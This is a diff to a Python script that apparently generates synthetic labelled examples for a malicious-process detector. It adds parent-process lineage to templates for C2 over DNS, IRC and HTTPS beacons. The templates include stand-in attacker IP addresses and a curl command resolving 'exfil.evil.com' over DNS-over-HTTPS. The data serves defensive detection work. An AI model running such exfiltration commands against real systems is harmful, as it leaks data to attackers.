@@ -13,8 +13,10 @@ TS_MIN, TS_MAX = 1749000000, 1781300000
 EVIL = ["185.220.101.45", "45.137.21.9", "91.92.109.43"]
 
 
-def fmt(name, pid, uid, exe, cmd, ts, conns=None, files=None, kids=None):
+def fmt(name, pid, uid, exe, cmd, ts, conns=None, files=None, kids=None, lineage=None):
     base = f"{name} PID:{pid} uid:{uid} exe:{exe} cmd:{cmd} time:{ts}"
+    if lineage:
+        base += " parent_lineage:[" + "\u2192".join(lineage) + "]"
     if conns:
         base += f" outbound_connections:[{','.join(sorted(conns))}]"
     if files:
@@ -30,20 +32,28 @@ def evil_conn(port):
     return f"{random.choice(EVIL)}:{port}"
 
 
+MALICIOUS_LINEAGE = [
+    ["nginx", "sh"], ["nginx", "bash", "sh"],
+    ["systemd", "containerd-shim", "bash"], ["containerd-shim", "bash", "curl"],
+    ["sshd", "bash", "sh"], ["systemd", "sh", "curl"],
+    ["cron", "bash"], ["apache2", "sh"],
+]
+def _mal_lin(): return random.choice(MALICIOUS_LINEAGE)
+
 TEMPLATES = [
-    dict(category="c2_dns", mitre=["T1071.004", "T1572"],
+    dict(lineage=_mal_lin, category="c2_dns", mitre=["T1071.004", "T1572"],
          name="python3", exe="/tmp/.dns", uid=1000,
          cmd="-c 'dns.exfil...'", conns=lambda: [evil_conn(53)],
          reasoning="DNS tunneling to suspicious resolver — C2 over DNS."),
-    dict(category="c2_irc", mitre=["T1071", "T1102"],
+    dict(lineage=_mal_lin, category="c2_irc", mitre=["T1071", "T1102"],
          name=".irc", exe="/dev/shm/.irc", uid=1000,
          cmd="", conns=lambda: [evil_conn(6667)],
          reasoning="IRC bot connecting to classic C2 port 6667."),
-    dict(category="c2_https_beacon", mitre=["T1071.001", "T1573"],
+    dict(lineage=_mal_lin, category="c2_https_beacon", mitre=["T1071.001", "T1573"],
          name=".beacon", exe="/tmp/.beacon", uid=1000,
          cmd="--jitter 300", conns=lambda: [evil_conn(443)],
          reasoning="Jittered HTTPS beacon to unknown host."),
-    dict(category="c2_doh", mitre=["T1071.004"],
+    dict(lineage=_mal_lin, category="c2_doh", mitre=["T1071.004"],
          name="curl", exe="/usr/bin/curl", uid=1000,
          cmd="https://dns.google/resolve?name=exfil.evil.com",
          conns=lambda: [evil_conn(443)],
@@ -71,7 +81,8 @@ def main():
                 "tags": ["c2_variety", "round6"],
                 "input": fmt(t["name"], random.randint(1000, 99999), t["uid"], t["exe"],
                              t["cmd"], random.randint(TS_MIN, TS_MAX),
-                             conns, t.get("files"), t.get("kids")),
+                             conns, t.get("files"), t.get("kids"),
+                             (t["lineage"]() if callable(t.get("lineage")) else t.get("lineage"))),
                 "output": "QUARANTINE",
                 "reasoning": t["reasoning"],
             }
